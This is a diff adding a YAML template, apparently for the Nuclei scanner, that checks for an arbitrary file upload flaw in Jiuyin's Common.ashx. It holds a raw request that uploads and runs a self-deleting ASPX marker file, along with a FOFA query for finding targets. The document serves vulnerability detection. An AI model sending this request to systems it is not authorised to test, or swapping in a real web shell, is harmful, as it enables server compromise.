@@ -1,0 +1,43 @@
+id: jiuyin-common-file-upload
+
+info:
+  name: Jiuyin Common.ashx File Upload
+  author: qwtd
+  severity: critical
+  description: |
+    Jiuyin Common.ashx File Upload is a vulnerability that allows an attacker to upload arbitrary files to the server.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%B9%9D%E5%9E%A0%E7%A7%91%E6%8A%80/%E4%B9%9D%E5%9E%A0%E8%B5%A2%E5%95%86%E4%B8%9A%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FCommon.ashx%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa: title="九垠赢"
+    verified: true
+  tags: 九垠赢
+
+variables:
+  filename: "{{rand_base(8)}}"
+
+http:
+  - raw:
+      - |
+        POST /System/Common.ashx?type=savefile&path={{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6
+
+        --WebKitFormBoundaryHHaZAYecVOf5sfa6
+        Content-Disposition: form-data; name="content";
+        Content-Type: text/plain
+
+        <%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+        --WebKitFormBoundaryHHaZAYecVOf5sfa6--
+
+      - |
+        GET /System/{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "12321")'
+        condition: and
